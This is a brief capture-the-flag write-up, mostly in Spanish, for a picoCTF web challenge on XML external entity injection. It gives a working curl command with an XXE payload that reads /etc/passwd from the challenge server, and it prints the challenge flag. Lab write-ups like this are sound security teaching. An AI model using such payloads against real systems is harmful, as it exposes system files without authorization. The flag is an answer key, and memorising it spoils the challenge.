#Software #Hacking #WebExplotation #Web #Internet 
# Definición
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:61670/)
# Hints
- [[XML]] external entity Injection
# Solución
Iniciamos inspeccionando la página, y vemos los request que se generan con las peticiones.
Y al estar manejando XML, vemos la pestaña de red.

Nos apoyamos de FOXY PROXY y BURP para realizar un ataque de [[payloads]].

Enviamos la respuesta modificada empleando un [[CURL]]
```bash
curl -X POST "http://saturn.picoctf.net:60543/data" -H "Content-Type: application/xml" --data-binary @- <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>
    <ID>&xxe;</ID>
</data>
EOF
```
## Respuesta
picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}